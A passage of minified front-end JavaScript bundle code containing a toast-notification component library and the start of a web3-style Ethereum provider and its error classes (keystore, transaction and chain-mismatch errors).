                                    const {
                                        toastId: c,
                                        updateId: d,
                                        data: m,
                                        staleId: g,
                                        delay: v
                                    } = a, y = () => {
                                        h(c)
                                    }, b = null == d;
                                    b && i++;
                                    const w = { ...l,
                                        style: l.toastStyle,
                                        key: r++,
                                        ...Object.fromEntries(Object.entries(a).filter((e => {
                                            let [t, n] = e;
                                            return null != n
                                        }))),
                                        toastId: c,
                                        updateId: d,
                                        data: m,
                                        closeToast: y,
                                        isIn: !1,
                                        className: we(a.className || l.toastClassName),
                                        bodyClassName: we(a.bodyClassName || l.bodyClassName),
                                        progressClassName: we(a.progressClassName || l.progressClassName),
                                        autoClose: !a.isLoading && (x = a.autoClose, A = l.autoClose, !1 === x || ve(x) && x > 0 ? x : A),
                                        deleteToast() {
                                            const e = u.get(c),
                                                {
                                                    onClose: t,
                                                    children: r
                                                } = e.props;
                                            be(t) && t((0, s.isValidElement)(r) && r.props), n(ke(e, "removed")), u.delete(c), i--, i < 0 && (i = 0), o.length > 0 ? p(o.shift()) : f()
                                        }
                                    };
                                    var x, A;
                                    w.closeButton = l.closeButton, !1 === a.closeButton || xe(a.closeButton) ? w.closeButton = a.closeButton : !0 === a.closeButton && (w.closeButton = !xe(l.closeButton) || l.closeButton);
                                    let k = t;
                                    (0, s.isValidElement)(t) && !ye(t.type) ? k = (0, s.cloneElement)(t, {
                                        closeToast: y,
                                        toastProps: w,
                                        data: m
                                    }) : be(t) && (k = t({
                                        closeToast: y,
                                        toastProps: w,
                                        data: m
                                    }));
                                    const E = {
                                        content: k,
                                        props: w,
                                        staleId: g
                                    };
                                    l.limit && l.limit > 0 && i > l.limit && b ? o.push(E) : ve(v) ? setTimeout((() => {
                                        p(E)
                                    }), v) : p(E)
                                },
                                setProps(e) {
                                    l = e
                                },
                                setToggle: (e, t) => {
                                    u.get(e).toggle = t
                                },
                                isToastActive: e => a.some((t => t === e)),
                                getSnapshot: () => l.newestOnTop ? c.reverse() : c
                            }
                        }(t, e, _e);
                        Ee.set(t, r);
                        const i = r.observe(n);
                        return Se.forEach((e => Te(e.content, e.options))), Se = [], () => {
                            i(), Ee.delete(t)
                        }
                    },
                    setProps(e) {
                        var n;
                        null == (n = Ee.get(t)) || n.setProps(e)
                    },
                    getSnapshot() {
                        var e;
                        return null == (e = Ee.get(t)) ? void 0 : e.getSnapshot()
                    }
                }
            }(e)).current;
            r(e);
            const i = (0, s.useSyncExternalStore)(t, n, n);
            return {
                getToastToRender: function(e) {
                    if (!i) return [];
                    const t = new Map;
                    return i.forEach((e => {
                        const {
                            position: n
                        } = e.props;
                        t.has(n) || t.set(n, []), t.get(n).push(e)
                    })), Array.from(t, (t => e(t[0], t[1])))
                },
                isToastActive: Pe,
                count: null == i ? void 0 : i.length
            }
        }

        function Oe(e) {
            const [t, n] = (0, s.useState)(!1), [r, i] = (0, s.useState)(!1), o = (0, s.useRef)(null), a = (0, s.useRef)({
                start: 0,
                delta: 0,
                removalDistance: 0,
                canCloseOnClick: !0,
                canDrag: !1,
                didMove: !1
            }).current, {
                autoClose: c,
                pauseOnHover: l,
                closeToast: u,
                onClick: d,
                closeOnClick: f
            } = e;
            var h, p;

            function m() {
                n(!0)
            }

            function g() {
                n(!1)
            }

            function v(n) {
                const r = o.current;
                a.canDrag && r && (a.didMove = !0, t && g(), a.delta = "x" === e.draggableDirection ? n.clientX - a.start : n.clientY - a.start, a.start !== n.clientX && (a.canCloseOnClick = !1), r.style.transform = "translate3d(".concat("x" === e.draggableDirection ? "".concat(a.delta, "px, var(--y)") : "0, calc(".concat(a.delta, "px + var(--y))"), ",0)"), r.style.opacity = "" + (1 - Math.abs(a.delta / a.removalDistance)))
            }

            function y() {
                document.removeEventListener("pointermove", v), document.removeEventListener("pointerup", y);
                const t = o.current;
                if (a.canDrag && a.didMove && t) {
                    if (a.canDrag = !1, Math.abs(a.delta) > a.removalDistance) return i(!0), e.closeToast(), void e.collapseAll();
                    t.style.transition = "transform 0.2s, opacity 0.2s", t.style.removeProperty("transform"), t.style.removeProperty("opacity")
                }
            }
            null == (p = Ee.get((h = {
                id: e.toastId,
                containerId: e.containerId,
                fn: n
            }).containerId || 1)) || p.setToggle(h.id, h.fn), (0, s.useEffect)((() => {
                if (e.pauseOnFocusLoss) return document.hasFocus() || g(), window.addEventListener("focus", m), window.addEventListener("blur", g), () => {
                    window.removeEventListener("focus", m), window.removeEventListener("blur", g)
                }
            }), [e.pauseOnFocusLoss]);
            const b = {
                onPointerDown: function(t) {
                    if (!0 === e.draggable || e.draggable === t.pointerType) {
                        a.didMove = !1, document.addEventListener("pointermove", v), document.addEventListener("pointerup", y);
                        const n = o.current;
                        a.canCloseOnClick = !0, a.canDrag = !0, n.style.transition = "none", "x" === e.draggableDirection ? (a.start = t.clientX, a.removalDistance = n.offsetWidth * (e.draggablePercent / 100)) : (a.start = t.clientY, a.removalDistance = n.offsetHeight * (80 === e.draggablePercent ? 1.5 * e.draggablePercent : e.draggablePercent) / 100)
                    }
                },
                onPointerUp: function(t) {
                    const {
                        top: n,
                        bottom: r,
                        left: i,
                        right: a
                    } = o.current.getBoundingClientRect();
                    "touchend" !== t.nativeEvent.type && e.pauseOnHover && t.clientX >= i && t.clientX <= a && t.clientY >= n && t.clientY <= r ? g() : m()
                }
            };
            return c && l && (b.onMouseEnter = g, e.stacked || (b.onMouseLeave = m)), f && (b.onClick = e => {
                d && d(e), a.canCloseOnClick && u()
            }), {
                playToast: m,
                pauseToast: g,
                isRunning: t,
                preventExitTransition: r,
                toastRef: o,
                eventHandlers: b
            }
        }

        function Re(e) {
            let {
                delay: t,
                isRunning: n,
                closeToast: r,
                type: i = "default",
                hide: o,
                className: a,
                style: c,
                controlledProgress: l,
                progress: u,
                rtl: d,
                isIn: f,
                theme: h
            } = e;
            const p = o || l && 0 === u,
                m = { ...c,
                    animationDuration: "".concat(t, "ms"),
                    animationPlayState: n ? "running" : "paused"
                };
            l && (m.transform = "scaleX(".concat(u, ")"));
            const g = ge("Toastify__progress-bar", l ? "Toastify__progress-bar--controlled" : "Toastify__progress-bar--animated", "Toastify__progress-bar-theme--".concat(h), "Toastify__progress-bar--".concat(i), {
                    "Toastify__progress-bar--rtl": d
                }),
                v = be(a) ? a({
                    rtl: d,
                    type: i,
                    defaultClassName: g
                }) : ge(g, a),
                y = {
                    [l && u >= 1 ? "onTransitionEnd" : "onAnimationEnd"]: l && u < 1 ? null : () => {
                        f && r()
                    }
                };
            return s.createElement("div", {
                className: "Toastify__progress-bar--wrp",
                "data-hidden": p
            }, s.createElement("div", {
                className: "Toastify__progress-bar--bg Toastify__progress-bar-theme--".concat(h, " Toastify__progress-bar--").concat(i)
            }), s.createElement("div", {
                role: "progressbar",
                "aria-hidden": p ? "true" : "false",
                "aria-label": "notification timer",
                className: v,
                style: m,
                ...y
            }))
        }
        let Me = 1;
        const je = () => "" + Me++;

        function Fe(e) {
            return e && (ye(e.toastId) || ve(e.toastId)) ? e.toastId : je()
        }

        function Le(e, t) {
            return Te(e, t), t.toastId
        }

        function De(e, t) {
            return { ...t,
                type: t && t.type || e,
                toastId: Fe(t)
            }
        }

        function He(e) {
            return (t, n) => Le(t, De(e, n))
        }

        function Ue(e, t) {
            return Le(e, De("default", t))
        }
        Ue.loading = (e, t) => Le(e, De("default", {
            isLoading: !0,
            autoClose: !1,
            closeOnClick: !1,
            closeButton: !1,
            draggable: !1,
            ...t
        })), Ue.promise = function(e, t, n) {
            let r, {
                pending: i,
                error: o,
                success: a
            } = t;
            i && (r = ye(i) ? Ue.loading(i, n) : Ue.loading(i.render, { ...n,
                ...i
            }));
            const s = {
                    isLoading: null,
                    autoClose: null,
                    closeOnClick: null,
                    closeButton: null,
                    draggable: null
                },
                c = (e, t, i) => {
                    if (null == t) return void Ue.dismiss(r);
                    const o = {
                            type: e,
                            ...s,
                            ...n,
                            data: i
                        },
                        a = ye(t) ? {
                            render: t
                        } : t;
                    return r ? Ue.update(r, { ...o,
                        ...a
                    }) : Ue(a.render, { ...o,
                        ...a
                    }), i
                },
                l = be(e) ? e() : e;
            return l.then((e => c("success", a, e))).catch((e => c("error", o, e))), l
        }, Ue.success = He("success"), Ue.info = He("info"), Ue.error = He("error"), Ue.warning = He("warning"), Ue.warn = Ue.warning, Ue.dark = (e, t) => Le(e, De("default", {
            theme: "dark",
            ...t
        })), Ue.dismiss = function(e) {
            ! function(e) {
                var t;
                if (Ie()) {
                    if (null == e || ye(t = e) || ve(t)) Ee.forEach((t => {
                        t.removeToast(e)
                    }));
                    else if (e && ("containerId" in e || "id" in e)) {
                        const t = Ee.get(e.containerId);
                        t ? t.removeToast(e.id) : Ee.forEach((t => {
                            t.removeToast(e.id)
                        }))
                    }
                } else Se = Se.filter((t => null != e && t.options.toastId !== e))
            }(e)
        }, Ue.clearWaitingQueue = function(e) {
            void 0 === e && (e = {}), Ee.forEach((t => {
                !t.props.limit || e.containerId && t.id !== e.containerId || t.clearQueue()
            }))
        }, Ue.isActive = Pe, Ue.update = function(e, t) {
            void 0 === t && (t = {});
            const n = ((e, t) => {
                var n;
                let {
                    containerId: r
                } = t;
                return null == (n = Ee.get(r || 1)) ? void 0 : n.toasts.get(e)
            })(e, t);
            if (n) {
                const {
                    props: r,
                    content: i
                } = n, o = {
                    delay: 100,
                    ...r,
                    ...t,
                    toastId: t.toastId || e,
                    updateId: je()
                };
                o.toastId !== e && (o.staleId = e);
                const a = o.render || i;
                delete o.render, Le(a, o)
            }
        }, Ue.done = e => {
            Ue.update(e, {
                progress: 1
            })
        }, Ue.onChange = function(e) {
            return Ce.add(e), () => {
                Ce.delete(e)
            }
        }, Ue.play = e => Be(!0, e), Ue.pause = e => Be(!1, e);
        const ze = "undefined" != typeof window ? s.useLayoutEffect : s.useEffect,
            Ge = e => {
                let {
                    theme: t,
                    type: n,
                    isLoading: r,
                    ...i
                } = e;
                return s.createElement("svg", {
                    viewBox: "0 0 24 24",
                    width: "100%",
                    height: "100%",
                    fill: "colored" === t ? "currentColor" : "var(--toastify-icon-color-".concat(n, ")"),
                    ...i
                })
            },
            qe = {
                info: function(e) {
                    return s.createElement(Ge, { ...e
                    }, s.createElement("path", {
                        d: "M12 0a12 12 0 1012 12A12.013 12.013 0 0012 0zm.25 5a1.5 1.5 0 11-1.5 1.5 1.5 1.5 0 011.5-1.5zm2.25 13.5h-4a1 1 0 010-2h.75a.25.25 0 00.25-.25v-4.5a.25.25 0 00-.25-.25h-.75a1 1 0 010-2h1a2 2 0 012 2v4.75a.25.25 0 00.25.25h.75a1 1 0 110 2z"
                    }))
                },
                warning: function(e) {
                    return s.createElement(Ge, { ...e
                    }, s.createElement("path", {
                        d: "M23.32 17.191L15.438 2.184C14.728.833 13.416 0 11.996 0c-1.42 0-2.733.833-3.443 2.184L.533 17.448a4.744 4.744 0 000 4.368C1.243 23.167 2.555 24 3.975 24h16.05C22.22 24 24 22.044 24 19.632c0-.904-.251-1.746-.68-2.44zm-9.622 1.46c0 1.033-.724 1.823-1.698 1.823s-1.698-.79-1.698-1.822v-.043c0-1.028.724-1.822 1.698-1.822s1.698.79 1.698 1.822v.043zm.039-12.285l-.84 8.06c-.057.581-.408.943-.897.943-.49 0-.84-.367-.896-.942l-.84-8.065c-.057-.624.25-1.095.779-1.095h1.91c.528.005.84.476.784 1.1z"
                    }))
                },
                success: function(e) {
                    return s.createElement(Ge, { ...e
                    }, s.createElement("path", {
                        d: "M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z"
                    }))
                },
                error: function(e) {
                    return s.createElement(Ge, { ...e
                    }, s.createElement("path", {
                        d: "M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z"
                    }))
                },
                spinner: function() {
                    return s.createElement("div", {
                        className: "Toastify__spinner"
                    })
                }
            },
            Qe = e => {
                const {
                    isRunning: t,
                    preventExitTransition: n,
                    toastRef: r,
                    eventHandlers: i,
                    playToast: o
                } = Oe(e), {
                    closeButton: a,
                    children: c,
                    autoClose: l,
                    onClick: u,
                    type: d,
                    hideProgressBar: f,
                    closeToast: h,
                    transition: p,
                    position: m,
                    className: g,
                    style: v,
                    bodyClassName: y,
                    bodyStyle: b,
                    progressClassName: w,
                    progressStyle: x,
                    updateId: A,
                    role: k,
                    progress: E,
                    rtl: S,
                    toastId: C,
                    deleteToast: _,
                    isIn: I,
                    isLoading: P,
                    closeOnClick: T,
                    theme: B
                } = e, N = ge("Toastify__toast", "Toastify__toast-theme--".concat(B), "Toastify__toast--".concat(d), {
                    "Toastify__toast--rtl": S
                }, {
                    "Toastify__toast--close-on-click": T
                }), O = be(g) ? g({
                    rtl: S,
                    position: m,
                    type: d,
                    defaultClassName: N
                }) : ge(N, g), R = function(e) {
                    let {
                        theme: t,
                        type: n,
                        isLoading: r,
                        icon: i
                    } = e, o = null;
                    const a = {
                        theme: t,
                        type: n
                    };
                    return !1 === i || (be(i) ? o = i({ ...a,
                        isLoading: r
                    }) : (0, s.isValidElement)(i) ? o = (0, s.cloneElement)(i, a) : r ? o = qe.spinner() : (e => e in qe)(n) && (o = qe[n](a))), o
                }(e), M = !!E || !l, j = {
                    closeToast: h,
                    type: d,
                    theme: B
                };
                let F = null;
                return !1 === a || (F = be(a) ? a(j) : (0, s.isValidElement)(a) ? (0, s.cloneElement)(a, j) : function(e) {
                    let {
                        closeToast: t,
                        theme: n,
                        ariaLabel: r = "close"
                    } = e;
                    return s.createElement("button", {
                        className: "Toastify__close-button Toastify__close-button--".concat(n),
                        type: "button",
                        onClick: e => {
                            e.stopPropagation(), t(e)
                        },
                        "aria-label": r
                    }, s.createElement("svg", {
                        "aria-hidden": "true",
                        viewBox: "0 0 14 16"
                    }, s.createElement("path", {
                        fillRule: "evenodd",
                        d: "M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z"
                    })))
                }(j)), s.createElement(p, {
                    isIn: I,
                    done: _,
                    position: m,
                    preventExitTransition: n,
                    nodeRef: r,
                    playToast: o
                }, s.createElement("div", {
                    id: C,
                    onClick: u,
                    "data-in": I,
                    className: O,
                    ...i,
                    style: v,
                    ref: r
                }, s.createElement("div", { ...I && {
                        role: k
                    },
                    className: be(y) ? y({
                        type: d
                    }) : ge("Toastify__toast-body", y),
                    style: b
                }, null != R && s.createElement("div", {
                    className: ge("Toastify__toast-icon", {
                        "Toastify--animate-icon Toastify__zoom-enter": !P
                    })
                }, R), s.createElement("div", null, c)), F, s.createElement(Re, { ...A && !M ? {
                        key: "pb-".concat(A)
                    } : {},
                    rtl: S,
                    theme: B,
                    delay: l,
                    isRunning: t,
                    isIn: I,
                    closeToast: h,
                    hide: f,
                    type: d,
                    style: x,
                    className: w,
                    controlledProgress: M,
                    progress: E || 0
                })))
            },
            We = function(e, t) {
                return void 0 === t && (t = !1), {
                    enter: "Toastify--animate Toastify__".concat(e, "-enter"),
                    exit: "Toastify--animate Toastify__".concat(e, "-exit"),
                    appendPosition: t
                }
            },
            Ve = Ae(We("bounce", !0)),
            Ze = (Ae(We("slide", !0)), Ae(We("zoom")), Ae(We("flip")), {
                position: "top-right",
                transition: Ve,
                autoClose: 5e3,
                closeButton: !0,
                pauseOnHover: !0,
                pauseOnFocusLoss: !0,
                draggable: "touch",
                draggablePercent: 80,
                draggableDirection: "x",
                role: "alert",
                theme: "light"
            });

        function Ke(e) {
            let t = { ...Ze,
                ...e
            };
            const n = e.stacked,
                [r, i] = (0, s.useState)(!0),
                o = (0, s.useRef)(null),
                {
                    getToastToRender: a,
                    isToastActive: c,
                    count: l
                } = Ne(t),
                {
                    className: u,
                    style: d,
                    rtl: f,
                    containerId: h
                } = t;

            function p(e) {
                const t = ge("Toastify__toast-container", "Toastify__toast-container--".concat(e), {
                    "Toastify__toast-container--rtl": f
                });
                return be(u) ? u({
                    position: e,
                    rtl: f,
                    defaultClassName: t
                }) : ge(t, we(u))
            }

            function m() {
                n && (i(!0), Ue.play())
            }
            return ze((() => {
                if (n) {
                    var e;
                    const n = o.current.querySelectorAll('[data-in="true"]'),
                        i = 12,
                        a = null == (e = t.position) ? void 0 : e.includes("top");
                    let s = 0,
                        c = 0;
                    Array.from(n).reverse().forEach(((e, t) => {
                        const n = e;
                        n.classList.add("Toastify__toast--stacked"), t > 0 && (n.dataset.collapsed = "".concat(r)), n.dataset.pos || (n.dataset.pos = a ? "top" : "bot");
                        const o = s * (r ? .2 : 1) + (r ? 0 : i * t);
                        n.style.setProperty("--y", "".concat(a ? o : -1 * o, "px")), n.style.setProperty("--g", "".concat(i)), n.style.setProperty("--s", "" + (1 - (r ? c : 0))), s += n.offsetHeight, c += .025
                    }))
                }
            }), [r, l, n]), s.createElement("div", {
                ref: o,
                className: "Toastify",
                id: h,
                onMouseEnter: () => {
                    n && (i(!1), Ue.pause())
                },
                onMouseLeave: m
            }, a(((e, t) => {
                const r = t.length ? { ...d
                } : { ...d,
                    pointerEvents: "none"
                };
                return s.createElement("div", {
                    className: p(e),
                    style: r,
                    key: "container-".concat(e)
                }, t.map((e => {
                    let {
                        content: t,
                        props: r
                    } = e;
                    return s.createElement(Qe, { ...r,
                        stacked: n,
                        collapseAll: m,
                        isIn: c(r.toastId, r.containerId),
                        style: r.style,
                        key: "toast-".concat(r.key)
                    }, t)
                })))
            })))
        }
        var Je, Ye;
        ! function(e) {
            e.NUMBER = "NUMBER_NUMBER", e.HEX = "NUMBER_HEX", e.STR = "NUMBER_STR", e.BIGINT = "NUMBER_BIGINT"
        }(Je || (Je = {})),
        function(e) {
            e.HEX = "BYTES_HEX", e.UINT8ARRAY = "BYTES_UINT8ARRAY"
        }(Ye || (Ye = {}));
        const Xe = {
                number: Je.BIGINT,
                bytes: Ye.HEX
            },
            $e = {
                number: Je.HEX,
                bytes: Ye.HEX
            };
        var et, tt;
        ! function(e) {
            e.EARLIEST = "earliest", e.LATEST = "latest", e.PENDING = "pending", e.SAFE = "safe", e.FINALIZED = "finalized"
        }(et || (et = {})),
        function(e) {
            e.chainstart = "chainstart", e.frontier = "frontier", e.homestead = "homestead", e.dao = "dao", e.tangerineWhistle = "tangerineWhistle", e.spuriousDragon = "spuriousDragon", e.byzantium = "byzantium", e.constantinople = "constantinople", e.petersburg = "petersburg", e.istanbul = "istanbul", e.muirGlacier = "muirGlacier", e.berlin = "berlin", e.london = "london", e.altair = "altair", e.arrowGlacier = "arrowGlacier", e.grayGlacier = "grayGlacier", e.bellatrix = "bellatrix", e.merge = "merge", e.capella = "capella", e.shanghai = "shanghai"
        }(tt || (tt = {}));
        const nt = Object.getPrototypeOf(Uint8Array);
        var rt = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const it = Symbol.for("web3/base-provider");
        class ot {
            static isWeb3Provider(e) {
                return e instanceof ot || Boolean(e && e[it])
            }
            get[it]() {
                return !0
            }
            send(e, t) {
                this.request(e).then((e => {
                    t(null, e)
                })).catch((e => {
                    t(e)
                }))
            }
            sendAsync(e) {
                return rt(this, void 0, void 0, (function*() {
                    return this.request(e)
                }))
            }
            asEIP1193Provider() {
                const e = Object.create(this),
                    t = e.request;
                return e.request = function(e) {
                    return rt(this, void 0, void 0, (function*() {
                        return (yield t(e)).result
                    }))
                }, e.asEIP1193Provider = void 0, e
            }
        }
        class at extends Array {
            constructor(e) {
                super(), this._accountProvider = e
            }
        }
        const st = 4001,
            ct = 4100,
            lt = 4200,
            ut = 4900,
            dt = 4901,
            ft = -32700,
            ht = -32600,
            pt = -32601,
            mt = -32602,
            gt = -32603,
            vt = -32e3,
            yt = -32001,
            bt = -32002,
            wt = -32003,
            xt = -32004,
            At = -32005,
            kt = -32006;
        class Et extends Error {
            constructor(e, t) {
                super(e), Array.isArray(t) ? this.cause = new St(t) : this.cause = t, this.name = this.constructor.name, "function" === typeof Error.captureStackTrace ? Error.captureStackTrace(new.target.constructor) : this.stack = (new Error).stack
            }
            get innerError() {
                return this.cause instanceof St ? this.cause.errors : this.cause
            }
            set innerError(e) {
                Array.isArray(e) ? this.cause = new St(e) : this.cause = e
            }
            static convertToString(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                if (null === e || void 0 === e) return "undefined";
                const n = JSON.stringify(e, ((e, t) => "bigint" === typeof t ? t.toString() : t));
                return t && ["bigint", "string"].includes(typeof e) ? n.replace(/['\\"]+/g, "") : n
            }
            toJSON() {
                return {
                    name: this.name,
                    code: this.code,
                    message: this.message,
                    cause: this.cause,
                    innerError: this.cause
                }
            }
        }
        class St extends Et {
            constructor(e) {
                super("Multiple errors occurred: [".concat(e.map((e => e.message)).join("], ["), "]")), this.code = 208, this.errors = e
            }
        }
        class Ct extends Et {
            constructor(e, t) {
                super('Invalid value given "'.concat(Et.convertToString(e, !0), '". Error: ').concat(t, ".")), this.name = this.constructor.name
            }
        }
        class _t extends Et {
            constructor() {
                super("Private key must be 32 bytes."), this.code = 701
            }
        }
        class It extends Et {
            constructor() {
                super("Invalid Private Key, Not a valid string or uint8Array"), this.code = 702
            }
        }
        class Pt extends Et {
            constructor(e) {
                super('"'.concat(e, '"')), this.code = 802
            }
        }
        class Tt extends Et {
            constructor() {
                super("Invalid key derivation function"), this.code = 703
            }
        }
        class Bt extends Et {
            constructor() {
                super("Key derivation failed - possibly wrong password"), this.code = 704
            }
        }
        class Nt extends Et {
            constructor() {
                super("Unsupported key store version"), this.code = 705
            }
        }
        class Ot extends Et {
            constructor() {
                super("Password cannot be empty"), this.code = 706
            }
        }
        class Rt extends Et {
            constructor() {
                super("Initialization vector must be 16 bytes"), this.code = 707
            }
        }
        class Mt extends Et {
            constructor() {
                super("c > 1000, pbkdf2 is less secure with less iterations"), this.code = 709
            }
        }
        class jt extends Et {
            constructor(e, t) {
                super(e), this.code = 500, t && (this.errorCode = t.code, this.errorReason = t.reason)
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    errorCode: this.errorCode,
                    errorReason: this.errorReason
                })
            }
        }
        class Ft extends jt {
            constructor(e) {
                super("Connection not open", e), this.code = 503
            }
        }
        class Lt extends jt {
            constructor(e) {
                super("Maximum number of reconnect attempts reached! (".concat(e, ")")), this.code = 505
            }
        }
        class Dt extends jt {
            constructor() {
                super("CONNECTION ERROR: Provider started to reconnect before the response got received!"), this.code = 506
            }
        }
        class Ht extends jt {
            constructor(e) {
                super("Request already sent with following id: ".concat(e)), this.code = 507
            }
        }
        class Ut extends Et {
            constructor(e, t) {
                super(e), this.code = 300, this.receipt = t
            }
        }
        class zt extends Et {
            constructor(e, t) {
                super("The resolver at ".concat(e, ' does not implement requested method: "').concat(t, '".')), this.address = e, this.name = t, this.code = 301
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    address: this.address,
                    name: this.name
                })
            }
        }
        class Gt extends Ut {
            constructor(e) {
                if (super(e.message || "Error"), this.name = "name" in e && e.name || this.constructor.name, this.stack = "stack" in e && e.stack || void 0, this.code = e.code, "object" === typeof e.data) {
                    let t;
                    t = "originalError" in e.data ? e.data.originalError : e.data, this.data = t.data, this.cause = new Gt(t)
                } else this.data = e.data
            }
            setDecodedProperties(e, t, n) {
                this.errorName = e, this.errorSignature = t, this.errorArgs = n
            }
            toJSON() {
                let e = Object.assign(Object.assign({}, super.toJSON()), {
                    data: this.data
                });
                return this.errorName && (e = Object.assign(Object.assign({}, e), {
                    errorName: this.errorName,
                    errorSignature: this.errorSignature,
                    errorArgs: this.errorArgs
                })), e
            }
        }
        class qt extends Ut {
            constructor(e) {
                super("Error happened while trying to execute a function inside a smart contract"), this.code = 310, this.cause = new Gt(e)
            }
        }
        class Qt extends Ct {
            constructor(e) {
                var t, n;
                super("data: ".concat(null !== (t = e.data) && void 0 !== t ? t : "undefined", ", input: ").concat(null !== (n = e.input) && void 0 !== n ? n : "undefined"), 'You can\'t have "data" and "input" as properties of a contract at the same time, please use either "data" or "input" instead.'), this.code = 311
            }
        }
        class Wt extends Et {
            constructor(e) {
                super("ENS is not supported on network ".concat(e)), this.code = 902
            }
        }
        class Vt extends Et {
            constructor() {
                super("Network not synced"), this.code = 903
            }
        }
        class Zt extends Et {
            constructor(e) {
                super('Invalid parameters passed. "'.concat("undefined" !== typeof e ? e : "", '"')), this.hint = e, this.code = 207
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    hint: this.hint
                })
            }
        }
        class Kt extends Et {
            constructor() {
                super(...arguments), this.code = 201
            }
        }
        class Jt extends Et {
            constructor() {
                super("The method you're trying to call is not implemented."), this.code = 202
            }
        }
        class Yt extends Et {
            constructor() {
                super(...arguments), this.code = 203
            }
        }
        class Xt extends Et {
            constructor() {
                super(...arguments), this.code = 204
            }
        }
        class $t extends Et {
            constructor(e, t) {
                super(e), this.code = 205, this.props = null !== t && void 0 !== t ? t : {}
            }
        }
        class en extends Et {
            constructor(e) {
                super("A plugin with the namespace: ".concat(e, " has already been registered.")), this.code = 206
            }
        }
        class tn extends Et {
            constructor() {
                super(...arguments), this.code = 600
            }
        }
        class nn extends Et {
            constructor(e) {
                super('Client URL "'.concat(e, '" is invalid.')), this.code = 602
            }
        }
        class rn extends Et {
            constructor() {
                super(...arguments), this.code = 603
            }
        }
        class on extends Et {
            constructor() {
                super(...arguments), this.code = 604
            }
        }
        class an extends Ct {
            constructor() {
                super(...arguments), this.code = 801
            }
        }
        class sn extends Et {
            constructor(e, t) {
                super(e), this.receipt = t, this.code = 400
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    receipt: this.receipt
                })
            }
        }
        class cn extends Et {
            constructor(e, t, n, r) {
                super("Transaction has been reverted by the EVM".concat(void 0 === n ? "" : ":\n ".concat(Et.convertToString(n)))), this.reason = e, this.signature = t, this.receipt = n, this.data = r, this.code = 402
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    reason: this.reason,
                    signature: this.signature,
                    receipt: this.receipt,
                    data: this.data
                })
            }
        }
        class ln extends cn {
            constructor(e, t, n, r, i, o, a) {
                super(e), this.reason = e, this.customErrorName = t, this.customErrorDecodedSignature = n, this.customErrorArguments = r, this.signature = i, this.receipt = o, this.data = a, this.code = 438
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    reason: this.reason,
                    customErrorName: this.customErrorName,
                    customErrorDecodedSignature: this.customErrorDecodedSignature,
                    customErrorArguments: this.customErrorArguments,
                    signature: this.signature,
                    receipt: this.receipt,
                    data: this.data
                })
            }
        }
        class un extends sn {
            constructor(e) {
                super("Transaction has been reverted by the EVM".concat(void 0 === e ? "" : ":\n ".concat(Et.convertToString(e))), e), this.code = 405
            }
        }
        class dn extends sn {
            constructor() {
                super("Raw transaction undefined"), this.code = 407
            }
        }
        class fn extends sn {
            constructor() {
                super("Transaction not found"), this.code = 430
            }
        }
        class hn extends Ct {
            constructor(e) {
                super(e, "invalid transaction with invalid sender"), this.code = 408
            }
        }
        class pn extends Ct {
            constructor(e) {
                super(e, "invalid transaction with invalid receiver"), this.code = 437
            }
        }
        class mn extends Ct {
            constructor() {
                super("MissingCustomChainError", "If tx.common is provided it must have tx.common.customChain"), this.code = 410
            }
        }
        class gn extends Ct {
            constructor() {
                super("MissingCustomChainIdError", "If tx.common is provided it must have tx.common.customChain and tx.common.customChain.chainId"), this.code = 411
            }
        }
        class vn extends Ct {
            constructor(e) {
                super(JSON.stringify(e), "Chain Id doesnt match in tx.chainId tx.common.customChain.chainId"), this.code = 412
            }
        }
        class yn extends Ct {
            constructor(e) {
                super(JSON.stringify(e), "Chain doesnt match in tx.chain tx.common.basechain"), this.code = 435
            }
        }
        class bn extends Ct {
            constructor(e) {
                super(JSON.stringify(e), "hardfork doesnt match in tx.hardfork tx.common.hardfork"), this.code = 436
            }
        }
        class wn extends Ct {
            constructor() {
                super("CommonOrChainAndHardforkError", "Please provide the common object or the chain and hardfork property but not all together."), this.code = 413
            }
        }
        class xn extends Ct {
            constructor(e) {
                var t, n;
                super("MissingChainOrHardforkError", 'When specifying chain and hardfork, both values must be defined. Received "chain": '.concat(null !== (t = e.chain) && void 0 !== t ? t : "undefined", ', "hardfork": ').concat(null !== (n = e.hardfork) && void 0 !== n ? n : "undefined")), this.code = 414
            }
        }
        class An extends Et {
            constructor() {
                super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions'), this.code = 440
            }
        }
        class kn extends Ct {
            constructor(e) {
                var t, n, r, i;
